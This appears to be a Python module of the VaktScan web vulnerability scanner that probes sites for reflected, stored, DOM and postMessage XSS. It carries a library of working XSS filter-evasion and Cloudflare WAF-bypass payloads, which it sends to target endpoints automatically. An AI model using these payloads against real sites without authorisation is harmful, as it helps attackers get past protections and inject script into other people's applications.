"""
xss_checks.py - Comprehensive XSS detection module for VaktScan.

Covers reflected XSS surface probing, filter bypass testing, stored XSS
upload path auditing, DOM XSS source-sink indicators, and postMessage
security analysis.

Entry point:
    async def run_checks(alive_urls: list[str], concurrency: int = 20) -> list[dict]
"""

from __future__ import annotations

import asyncio
import datetime
import re
from urllib.parse import urlparse, quote

import httpx

MODULE_NAME = "XSSChecks"
_DEFAULT_TIMEOUT = 8.0

# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────

def _origin(url: str) -> str:
    p = urlparse(url)
    port = p.port
    if port is None:
        port = 443 if p.scheme == "https" else 80
    return f"{p.scheme}://{p.hostname}:{port}"


def _make_finding(
    *,
    url: str,
    payload_url: str,
    vulnerability: str,
    status: str,
    severity: str,
    details: str,
    http_status: str = "N/A",
    page_title: str = "N/A",
    content_length: str = "N/A",
    service_version: str = "N/A",
) -> dict:
    p = urlparse(url)
    host = p.hostname or url
    port = str(p.port or (443 if p.scheme == "https" else 80))
    return {
        "status":          status,
        "vulnerability":   vulnerability,
        "target":          host,
        "resolved_ip":     "N/A",
        "port":            port,
        "url":             url,
        "payload_url":     payload_url,
        "module":          MODULE_NAME,
        "service_version": service_version,
        "severity":        severity,
        "details":         details,
        "http_status":     http_status,
        "page_title":      page_title,
        "content_length":  content_length,
        "timestamp":       datetime.datetime.utcnow().isoformat() + "Z",
    }


# ──────────────────────────────────────────────────────────────────────────────
# Payload library
# ──────────────────────────────────────────────────────────────────────────────

_CANARY = "vktscan9x7q2"
_TAG_CANARY = f"<{_CANARY}>"
_ESCAPED_TAG = f"&lt;{_CANARY}&gt;"

_BYPASS_PAYLOADS = {
    "whitespace": [
        "<img\x0csrc=x\x0conerror=alert(1)>",
        "<img\x0bsrc=x\x0bonerror=alert(1)>",
        "<img\x09src=x\x09onerror=alert(1)>",
        "<img\x0asrc=x\x0aonerror=alert(1)>",
        "<img\x0dsrc=x\x0donerror=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
    ],
    "alt_tags": [
        "<svg/onload=alert(1)>",
        "<details/open/ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
    ],
    "encoding": [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
        "<img src=x onerror=al\\u0065rt(1)>",
        "<a href=javascript&#58;alert(1)>click</a>",
        "<a href=&#106;avascript:alert(1)>click</a>",
        "<a href=javas\tcript:alert(1)>click</a>",
    ],
    "protocol": [
        "<a href='javascript:alert(1)'>x</a>",
        "<a href='vbscript:alert(1)'>x</a>",
        "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
        "<iframe src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>",
    ],
    "events": [
        "<svg onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<img src=valid.jpg onload=alert(1)>",
        "<input type=image src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<div onmouseover=alert(1)>hover</div>",
        "<div onpointerover=alert(1)>hover</div>",
    ],
    "obfuscation": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<scr\x00ipt>alert(1)</script>",
        "<img src=x onerror=alert(1)//",
        "<<script>alert(1)//<</script>",
        "<img src='x'onerror='alert(1)'>",
    ],
    "dom_clobber": [
        "<form id=x><input name=innerHTML>",
        "<a id=x><a id=x name=href href=javascript:alert(1)>",
    ],
    "mxss": [
        "<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>",
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
    ],
    "cf_waf": [
        # Cloudflare managed-rules bypass: uncommon tags + events
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributename=x to=1>",
        "<svg><discard onbegin=alert(1)>",
        # Cloudflare bypass: class-based invocation avoids alert/prompt/confirm signatures
        "<img src=x onerror=window['al'+'ert'](1)>",
        "<img src=x onerror=self['al'+'ert'](1)>",
        "<img src=x onerror=top[/al/.source+/ert/.source](1)>",
        # Cloudflare bypass: backtick template literals
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert`1`>",
        # Cloudflare bypass: constructor chain (SSTI / template injection crossover)
        "<img src=x onerror=this.constructor.constructor('alert(1)')()>",
        # Cloudflare bypass: SVG + use/foreignObject
        "<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
        "<svg><foreignObject><body onload=alert(1)>",
        # Cloudflare bypass: double-URL-encoded (for apps that decode twice)
        "%253Csvg%2520onload%253Dalert(1)%253E",
        "%26lt%3Bsvg%20onload%3Dalert(1)%26gt%3B",
        # Cloudflare bypass: null bytes and unicode normalization
        "<img src=x onerror\x00=alert(1)>",
        "<\x00img src=x onerror=alert(1)>",
        # Cloudflare bypass: event via attribute injection in existing tags
        "' onfocus=alert(1) autofocus='",
        "\" onfocus=alert(1) autofocus=\"",
        '" onmouseover=alert(1) style="position:fixed;width:100%;height:100%" ',
        # Cloudflare bypass: data URI + base64 in iframe/object
        "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
        "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
    ],
}

# Markers that indicate a bypass payload was rendered rather than escaped
_BYPASS_MARKERS = {
    "whitespace": "onerror=",
    "alt_tags": "onerror=",
    "encoding": "onerror=",
    "protocol": "javascript:",
    "events": "onload=",
    "obfuscation": "alert(1)",
    "dom_clobber": "name=innerHTML",
    "mxss": "onerror=",
    "cf_waf": "alert(1)",
}

_CF_WAF_MARKERS = re.compile(
    r'(?:alert\(1\)|alert`1`|alert\x271\x27|'
    r'onerror\s*=|onload\s*=|onbegin\s*=|onfocus\s*=|onmouseover\s*=)'
)


# ──────────────────────────────────────────────────────────────────────────────
# Reflection endpoints
# ──────────────────────────────────────────────────────────────────────────────

_REFLECTION_ENDPOINTS = [
    ("/callback?error={payload}", "OAuth Callback"),
    ("/auth/callback?error_description={payload}", "Auth Callback"),
    ("/oauth/callback?error={payload}", "OAuth Callback"),
    ("/sso/callback?RelayState={payload}", "SSO Callback"),
    ("/saml/acs?error={payload}", "SAML ACS"),
    ("/login/oauth2/code?error={payload}", "OAuth2 Login"),
    ("/search?q={payload}", "Search"),
    ("/?s={payload}", "WordPress Search"),
    ("/?q={payload}", "Search Query"),
    ("/api/search?query={payload}", "API Search"),
    ("/error?message={payload}", "Error Page"),
    ("/404?url={payload}", "404 Handler"),
    ("/error?msg={payload}", "Error Message"),
    ("/redirect?url={payload}", "Redirect"),
    ("/goto?url={payload}", "Redirect"),
    ("/out?to={payload}", "Outbound Redirect"),
    ("/redir?next={payload}", "Redirect"),
    ("/api/jsonp?callback={payload}", "JSONP"),
    ("/jsonp?cb={payload}", "JSONP"),
    ("/preview?url={payload}", "Preview"),
    ("/debug?input={payload}", "Debug"),
    ("/api/v1/invalid/{payload}", "API Path"),
]

_UPLOAD_PATHS = [
    "/uploads/", "/upload/", "/files/", "/media/",
    "/attachments/", "/assets/uploads/", "/content/uploads/",
    "/wp-content/uploads/", "/sites/default/files/",
    "/storage/", "/public/uploads/", "/user-content/",
    "/static/uploads/", "/data/uploads/",
]

_DANGEROUS_DOM_PATTERNS = [
    (re.compile(r'\.innerHTML\s*=\s*[^"\';\n]*(?:location|document\.URL|document\.referrer|window\.name)'),
     "innerHTML assigned from URL/referrer/window.name"),
    (re.compile(r'document\.write\s*\(\s*[^)]*(?:location|document\.URL|document\.referrer)'),
     "document.write with URL-derived input"),
    (re.compile(r'eval\s*\(\s*[^)]*(?:location|document\.URL|document\.referrer|window\.name)'),
     "eval() with URL-derived input"),
    (re.compile(r'\.html\s*\(\s*[^)]*(?:location|document\.URL)'),
     "jQuery .html() with URL-derived input"),
    (re.compile(r'dangerouslySetInnerHTML\s*=\s*\{'),
     "React dangerouslySetInnerHTML usage"),
    (re.compile(r'\$\s*\([^)]*\)\.html\s*\(\s*[^)]*(?:location|document\.|window\.)'),
     "jQuery .html() with DOM source"),
]

_POSTMESSAGE_LISTENER = re.compile(r'addEventListener\s*\(\s*["\']message["\']')
_ORIGIN_CHECK = re.compile(r'\.origin\s*(?:===|!==|==|!=)')
_WILDCARD_POSTMESSAGE = re.compile(r'\.postMessage\s*\([^)]*,\s*[\"\']?\*[\"\']?\s*\)')

# HTTP status codes that indicate WAF blocks, access denial, or missing resources —
# reflections in these responses are URL echoes in error pages, not XSS.
_SKIP_STATUS_CODES = {401, 403, 404, 405, 406, 410, 451}

_ERROR_PAGE_SIGNATURES = re.compile(
    r'(?:access\s+denied|forbidden|not\s+found|request\s+rejected|'
    r'web\s+application\s+firewall|waf\s+block|security\s+violation|'
    r'blocked\s+by|error\s+page|cpanel|whm)',
    re.IGNORECASE,
)


def _marker_outside_url_echo(body: str, marker: str, payload_url: str) -> bool:
    """Return True only if *marker* appears in the response body independently
    of the request URL being echoed verbatim."""
    p = urlparse(payload_url)
    url_variants = {payload_url, p.path + ("?" + p.query if p.query else "")}
    if p.query:
        url_variants.add(p.query)
    stripped = body
    for variant in url_variants:
        stripped = stripped.replace(variant, "")
    return marker in stripped


# ──────────────────────────────────────────────────────────────────────────────
# Check 1 — Reflected XSS surface probing
# ──────────────────────────────────────────────────────────────────────────────

async def check_reflected_xss(url: str, client: httpx.AsyncClient) -> list[dict]:
    findings: list[dict] = []
    origin = _origin(url)

    # Negative control — detect catch-all servers
    neg_url = origin + "/_vaktscan_xss_neg_ctrl_7f3a"
    try:
        neg_resp = await client.get(neg_url)
    except Exception:
        neg_resp = None
    neg_body = neg_resp.text if neg_resp else ""

    for template, label in _REFLECTION_ENDPOINTS:
        canary_path = template.replace("{payload}", _CANARY)
        probe_url = origin + canary_path
        try:
            resp = await client.get(probe_url)
        except Exception:
            continue

        if resp.status_code > 499 or resp.status_code in _SKIP_STATUS_CODES:
            continue
        ct = resp.headers.get("content-type", "")
        if "text/html" not in ct and "text/xml" not in ct:
            continue
        if _CANARY not in resp.text:
            continue
        # Catch-all suppression
        if neg_resp and _CANARY in neg_body:
            continue
        # Error page suppression — if the canary only appears inside the echoed URL
        if not _marker_outside_url_echo(resp.text, _CANARY, probe_url):
            continue
        # Generic error page heuristic
        if resp.status_code >= 400 and _ERROR_PAGE_SIGNATURES.search(resp.text[:2048]):
            continue

        # Found reflection — test if tags survive
        tag_path = template.replace("{payload}", _TAG_CANARY)
        tag_url = origin + tag_path
        try:
            tag_resp = await client.get(tag_url)
        except Exception:
            tag_resp = None

        if tag_resp and _TAG_CANARY in tag_resp.text and _ESCAPED_TAG not in tag_resp.text:
            # Require 2xx for confirmed XSS
            if not (200 <= tag_resp.status_code < 300):
                continue
            findings.append(_make_finding(
                url=url,
                payload_url=probe_url,
                vulnerability=f"Reflected XSS — Unescaped HTML Tag Injection ({label})",
                status="VULNERABLE",
                severity="HIGH",
                details=(
                    f"Endpoint '{canary_path}' reflects user input into HTML without escaping. "
                    f"HTML tags injected via the parameter are rendered verbatim, confirming "
                    f"a reflected cross-site scripting vulnerability."
                ),
                http_status=str(tag_resp.status_code),
                content_length=str(len(tag_resp.content)),
            ))
        else:
            # Only report potential if response is 2xx
            if not (200 <= resp.status_code < 300):
                continue
            findings.append(_make_finding(
                url=url,
                payload_url=probe_url,
                vulnerability=f"Reflected Input Without HTML Encoding ({label})",
                status="POTENTIAL",
                severity="MEDIUM",
                details=(
                    f"Endpoint '{canary_path}' reflects user input in its HTML response. "
                    f"While basic tag injection appears filtered, the raw canary string was "
                    f"echoed without entity encoding, which may allow bypass via encoding "
                    f"tricks or attribute injection."
                ),
                http_status=str(resp.status_code),
                content_length=str(len(resp.content)),
            ))

    return findings


# ──────────────────────────────────────────────────────────────────────────────
# Check 2 — XSS filter bypass testing
# ──────────────────────────────────────────────────────────────────────────────

async def check_xss_filter_bypass(url: str, client: httpx.AsyncClient) -> list[dict]:
    findings: list[dict] = []
    origin = _origin(url)

    neg_url = origin + "/_vaktscan_xss_neg_ctrl_7f3a"
    try:
        neg_resp = await client.get(neg_url)
    except Exception:
        neg_resp = None
    neg_body = neg_resp.text if neg_resp else ""

    for template, label in _REFLECTION_ENDPOINTS:
        canary_path = template.replace("{payload}", _CANARY)
        probe_url = origin + canary_path
        try:
            resp = await client.get(probe_url)
        except Exception:
            continue

        # Require 2xx — 4xx/5xx responses echo URLs in error pages, not real reflection
        if not (200 <= resp.status_code < 300):
            continue
        ct = resp.headers.get("content-type", "")
        if "text/html" not in ct and "text/xml" not in ct:
            continue
        if _CANARY not in resp.text:
            continue
        if neg_resp and _CANARY in neg_body:
            continue
        if not _marker_outside_url_echo(resp.text, _CANARY, probe_url):
            continue

        # Canary reflected — check if tags are escaped (filtering is active)
        tag_path = template.replace("{payload}", _TAG_CANARY)
        tag_url = origin + tag_path
        try:
            tag_resp = await client.get(tag_url)
        except Exception:
            continue

        if tag_resp and _TAG_CANARY in tag_resp.text and _ESCAPED_TAG not in tag_resp.text:
            # Tags are not escaped — already a direct XSS, skip bypass testing
            continue

        # Detect Cloudflare — test more CF bypass payloads if present
        is_cloudflare = any(
            h in resp.headers.get("server", "").lower()
            for h in ("cloudflare",)
        ) or "cf-ray" in resp.headers

        # Tags ARE escaped — try bypass categories
        bypasses_found = 0
        for category, payloads in _BYPASS_PAYLOADS.items():
            if bypasses_found >= 3:
                break
            marker = _BYPASS_MARKERS.get(category, "alert(1)")
            # Test more CF payloads when Cloudflare is detected
            max_per_cat = 4 if (category == "cf_waf" and is_cloudflare) else 2
            for payload in payloads[:max_per_cat]:
                bypass_path = template.replace("{payload}", payload)
                bypass_url = origin + bypass_path
                try:
                    bypass_resp = await client.get(bypass_url)
                except Exception:
                    continue
                # Require 2xx for confirmed bypass
                if not (200 <= bypass_resp.status_code < 300):
                    continue
                # Marker must appear outside the URL echo
                body_stripped = bypass_resp.text
                bp = urlparse(bypass_url)
                for variant in (bypass_url, bp.path + ("?" + bp.query if bp.query else ""), bp.query or ""):
                    if variant:
                        body_stripped = body_stripped.replace(variant, "")
                if category == "cf_waf":
                    if not _CF_WAF_MARKERS.search(body_stripped):
                        continue
                else:
                    if marker not in body_stripped:
                        continue
                findings.append(_make_finding(
                    url=url,
                    payload_url=bypass_url,
                    vulnerability=f"XSS Filter Bypass via {category} ({label})",
                    status="CRITICAL",
                    severity="CRITICAL",
                    details=(
                        f"Endpoint '{canary_path}' escapes basic HTML tags but a "
                        f"{category} bypass payload was reflected unescaped. "
                        f"{'Cloudflare WAF bypass: ' if category == 'cf_waf' else ''}"
                        f"Bypass marker found in response body. "
                        f"Payload: {payload!r}"
                    ),
                    http_status=str(bypass_resp.status_code),
                    content_length=str(len(bypass_resp.content)),
                ))
                bypasses_found += 1
                break  # one finding per category

    return findings


# ──────────────────────────────────────────────────────────────────────────────
# Check 3 — Stored XSS upload surface audit
# ──────────────────────────────────────────────────────────────────────────────

async def check_stored_xss_surfaces(url: str, client: httpx.AsyncClient) -> list[dict]:
    findings: list[dict] = []
    origin = _origin(url)

    neg_url = origin + "/_vaktscan_upload_neg_ctrl_3a7f"
    try:
        neg_resp = await client.get(neg_url)
    except Exception:
        neg_resp = None

    for path in _UPLOAD_PATHS:
        probe_url = origin + path
        try:
            resp = await client.get(probe_url)
        except Exception:
            continue

        if resp.status_code != 200:
            continue
        # Catch-all suppression — use structural similarity (ignore CSRF tokens etc.)
        if neg_resp and neg_resp.status_code == 200:
            neg_stripped = re.sub(r'content="[^"]{8,}"', 'content="X"', neg_resp.text)
            resp_stripped = re.sub(r'content="[^"]{8,}"', 'content="X"', resp.text)
            if neg_stripped == resp_stripped:
                continue

        ct = resp.headers.get("content-type", "")
        disposition = resp.headers.get("content-disposition", "")
        nosniff = resp.headers.get("x-content-type-options", "")
        body_lower = resp.text[:4096].lower()

        has_listing = any(m in body_lower for m in (
            "index of", "directory listing", "parent directory",
            "[dir]", "last modified",
        ))
        if not has_listing:
            continue

        issues = []
        if "text/html" in ct:
            issues.append("Content-Type: text/html")
        if "attachment" not in disposition:
            issues.append("no Content-Disposition: attachment")
        if "nosniff" not in nosniff:
            issues.append("no X-Content-Type-Options: nosniff")

        if issues:
            findings.append(_make_finding(
                url=url,
                payload_url=probe_url,
                vulnerability=f"Upload Directory Serves Inline Content ({path})",
                status="POTENTIAL",
                severity="MEDIUM",
                details=(
                    f"Upload/file-serving path '{path}' returns a directory listing with "
                    f"missing security headers: {', '.join(issues)}. An attacker who can "
                    f"upload an HTML file could achieve stored XSS served on the application "
                    f"origin."
                ),
                http_status=str(resp.status_code),
                content_length=str(len(resp.content)),
            ))

    return findings


# ──────────────────────────────────────────────────────────────────────────────
# Check 4 — DOM XSS source→sink indicators
# ──────────────────────────────────────────────────────────────────────────────

async def check_dom_xss_indicators(url: str, client: httpx.AsyncClient) -> list[dict]:
    findings: list[dict] = []

    try:
        resp = await client.get(url)
    except Exception:
        return findings

    if resp.status_code != 200:
        return findings

    body = resp.text[:262144]  # scan first 256KB

    for pattern, description in _DANGEROUS_DOM_PATTERNS:
        if pattern.search(body):
            findings.append(_make_finding(
                url=url,
                payload_url=url,
                vulnerability=f"DOM XSS Indicator — {description}",
                status="POTENTIAL",
                severity="LOW",
                details=(
                    f"Page source contains a DOM XSS source→sink pattern: {description}. "
                    f"User-controllable input (URL fragment, query string, referrer, or "
                    f"window.name) may flow into a dangerous sink without sanitization."
                ),
                http_status=str(resp.status_code),
                content_length=str(len(resp.content)),
            ))

    return findings


# ──────────────────────────────────────────────────────────────────────────────
# Check 5 — postMessage security
# ──────────────────────────────────────────────────────────────────────────────

async def check_postmessage_handlers(url: str, client: httpx.AsyncClient) -> list[dict]:
    findings: list[dict] = []

    try:
        resp = await client.get(url)
    except Exception:
        return findings

    if resp.status_code != 200:
        return findings

    body = resp.text[:262144]

    # Check for message listeners without origin validation
    for match in _POSTMESSAGE_LISTENER.finditer(body):
        start = max(0, match.start() - 500)
        end = min(len(body), match.end() + 500)
        context = body[start:end]

        if not _ORIGIN_CHECK.search(context):
            findings.append(_make_finding(
                url=url,
                payload_url=url,
                vulnerability="postMessage Listener Without Origin Validation",
                status="VULNERABLE",
                severity="HIGH",
                details=(
                    "Page registers a 'message' event listener without checking "
                    "event.origin. Any cross-origin window can send arbitrary data "
                    "to this handler, potentially triggering XSS, credential theft, "
                    "or navigation hijacking."
                ),
                http_status=str(resp.status_code),
                content_length=str(len(resp.content)),
            ))
            break  # one finding per page

    # Check for wildcard postMessage sends
    if _WILDCARD_POSTMESSAGE.search(body):
        findings.append(_make_finding(
            url=url,
            payload_url=url,
            vulnerability="postMessage Sent With Wildcard Origin",
            status="POTENTIAL",
            severity="MEDIUM",
            details=(
                "Page sends data via postMessage with targetOrigin '*', meaning "
                "any window in the frame hierarchy can receive the message. If "
                "the payload contains tokens or session data, an attacker-controlled "
                "iframe or opener could intercept it."
            ),
            http_status=str(resp.status_code),
            content_length=str(len(resp.content)),
        ))

    return findings


# ──────────────────────────────────────────────────────────────────────────────
# Orchestration
# ──────────────────────────────────────────────────────────────────────────────

_ALL_CHECKS = [
    check_reflected_xss,
    check_xss_filter_bypass,
    check_stored_xss_surfaces,
    check_dom_xss_indicators,
    check_postmessage_handlers,
]


async def _run_checks_for_url(
    url: str,
    client: httpx.AsyncClient,
    semaphore: asyncio.Semaphore,
) -> list[dict]:
    async with semaphore:
        findings: list[dict] = []
        for check in _ALL_CHECKS:
            try:
                results = await check(url, client)
                findings.extend(results)
            except Exception:
                continue
        return findings


def _dedup_findings(findings: list[dict]) -> list[dict]:
    seen: set[tuple] = set()
    out: list[dict] = []
    for f in findings:
        key = (f.get("vulnerability", ""), f.get("payload_url", ""), f.get("target", ""))
        if key not in seen:
            seen.add(key)
            out.append(f)
    return out


async def run_checks(alive_urls: list[str], concurrency: int = 20) -> list[dict]:
    if not alive_urls:
        return []

    request_concurrency = max(1, int(concurrency))
    bundle_concurrency = max(1, request_concurrency // 50)
    semaphore = asyncio.Semaphore(bundle_concurrency)
    findings: list[dict] = []

    async with httpx.AsyncClient(
        verify=False,
        timeout=_DEFAULT_TIMEOUT,
        follow_redirects=True,
        limits=httpx.Limits(
            max_connections=request_concurrency,
            max_keepalive_connections=request_concurrency,
        ),
    ) as client:
        tasks = [_run_checks_for_url(url, client, semaphore) for url in alive_urls]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, list):
                findings.extend(res)

    return _dedup_findings(findings)
